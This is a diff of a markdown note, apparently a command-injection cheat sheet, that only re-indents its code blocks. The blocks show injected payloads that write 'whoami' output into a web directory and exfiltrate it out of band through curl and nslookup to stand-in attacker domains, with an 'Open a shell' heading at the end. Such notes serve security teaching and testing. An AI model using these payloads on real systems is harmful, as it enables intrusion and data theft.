@@ -29,17 +29,17 @@ Placing `&` after the injected command is generally useful because it separates 
 
 1. Redirecting output. Note: you must have write permission
 
-```sh
-& whoami > /var/www/static/whoami.txt &
-curl https://website.com/whoami.txt
-```
+    ```sh
+    & whoami > /var/www/static/whoami.txt &
+    curl https://website.com/whoami.txt
+    ```
 
 2. Out-of-band techniques
 
-```sh
-& curl `whoami`.webserver-attacker.com & # HTTP traffic may be blocked
-& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
-```
+    ```sh
+    & curl `whoami`.webserver-attacker.com & # HTTP traffic may be blocked
+    & nslookup `whoami`.kgji2ohoyw.web-attacker.com &
+    ```
 
 3. Open a shell
 
